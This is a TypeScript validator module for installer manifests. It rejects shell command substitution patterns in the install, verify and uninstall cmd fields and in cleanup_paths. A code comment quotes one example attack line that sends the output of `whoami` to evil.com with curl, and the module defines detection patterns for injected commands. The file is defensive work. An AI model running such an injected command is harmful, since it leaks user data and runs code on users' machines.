// Phase 1.1.1 hotfix per Paranoid Staff Engineer review B1.
//
// ADR 0001 § "字段拒绝清单" claims schema rejects ${shell command} dynamic
// substitution patterns, but v0.1 phase 1.1 schema only does structural
// validation (Type.String + minLength). This module fills the gap before
// phase 1.2 installer ships — without it, an upstream manifest with
// `cmd: 'curl evil.com/$(whoami)'` would pass validation, and the
// phase 1.2 installer that spawns the cmd string would execute arbitrary
// code on the user's machine.
//
// v0.2 plan: add a `requires_secret` schema field + explicit
// `${secret:KEY}` template syntax, at which point this detector should
// allow the `${secret:*}` whitelist while still rejecting raw `${VAR}`.
//
// Detected patterns (4):
//   - `$(...)`     POSIX command substitution
//   - `${...}`     variable expansion
//   - backtick     old-style command substitution
//   - dangerous    yaml tags (handled at parse layer by yaml@2.x; we
//                  don't double-check, but document the trust boundary)
//
// Targeted fields:
//   - spec.install.cmd
//   - spec.verify.cmd
//   - spec.uninstall.cmd
//   - spec.uninstall.cleanup_paths[*]

import type { Document, LineCounter, Node } from 'yaml'
import { isMap, isScalar, isSeq } from 'yaml'
import type { ValidationError } from './errors.js'

interface ShellPattern {
  test: (s: string) => boolean
  label: string
  hint: string
}

const PATTERNS: ShellPattern[] = [
  {
    label: '$(...)',
    hint: 'POSIX command substitution',
    test: (s) => /\$\(/.test(s),
  },
  {
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal pattern label, not a JS template
    label: '${...}',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal example in user-facing message
    hint: 'variable expansion (v0.2 will whitelist `${secret:KEY}`)',
    test: (s) => /\$\{/.test(s),
  },
  {
    label: 'backtick',
    hint: 'old-style command substitution',
    test: (s) => /`/.test(s),
  },
]

function lineOf(node: Node | null | undefined, lineCounter: LineCounter): number | null {
  if (!node?.range) return null
  const offset = node.range[0]
  return lineCounter.linePos(offset).line
}

function checkScalarCmd(
  doc: Document.Parsed,
  lineCounter: LineCounter,
  path: Array<string | number>,
  filename: string,
): ValidationError | null {
  const node = doc.getIn(path, true)
  if (!node || !isScalar(node)) return null
  const value = node.value
  if (typeof value !== 'string') return null
  for (const pat of PATTERNS) {
    if (pat.test(value)) {
      return {
        file: filename,
        path: `/${path.join('/')}`,
        message: `shell escape detected: '${pat.label}' (${pat.hint}) at ${path.join('.')} — v0.1 forbids dynamic shell evaluation; v0.2 will use \`requires_secret\` + \`\${secret:KEY}\` for env placeholders`,
        line: lineOf(node, lineCounter),
        column: null,
        keyword: 'security',
      }
    }
  }
  return null
}

/**
 * Pre-Ajv security gate per ADR 0001 § "字段拒绝清单".
 * Walks the parsed yaml AST and rejects any string-typed cmd field (or
 * cleanup_paths sequence element) containing `$(...)`, `${...}`, or
 * backticks. Returns ALL violations found (not short-circuit) so the
 * user can fix them in one pass.
 */
export function checkSecurityViolations(
  doc: Document.Parsed,
  filename: string,
  lineCounter: LineCounter,
): ValidationError[] {
  const errors: ValidationError[] = []

  // Walk known cmd paths. We do NOT do generic AST recursion because we
  // want surgical: only fields where the installer will spawn a shell.
  const cmdPaths: Array<Array<string | number>> = [
    ['spec', 'install', 'cmd'],
    ['spec', 'verify', 'cmd'],
    ['spec', 'uninstall', 'cmd'],
  ]

  for (const p of cmdPaths) {
    const err = checkScalarCmd(doc, lineCounter, p, filename)
    if (err) errors.push(err)
  }

  // cleanup_paths is a sequence of strings — iterate each element.
  const cleanupNode = doc.getIn(['spec', 'uninstall', 'cleanup_paths'], true)
  if (cleanupNode && isSeq(cleanupNode)) {
    cleanupNode.items.forEach((item, idx) => {
      if (!isScalar(item)) return
      const value = item.value
      if (typeof value !== 'string') return
      for (const pat of PATTERNS) {
        if (pat.test(value)) {
          errors.push({
            file: filename,
            path: `/spec/uninstall/cleanup_paths/${idx}`,
            message: `shell escape detected: '${pat.label}' (${pat.hint}) at spec.uninstall.cleanup_paths[${idx}] — v0.1 forbids dynamic shell evaluation`,
            line: lineOf(item, lineCounter),
            column: null,
            keyword: 'security',
          })
          break
        }
      }
    })
  }

  // Sanity guard: if doc has no spec block (incomplete manifest), skip silently;
  // Ajv will report the structural error.
  void isMap

  return errors
}
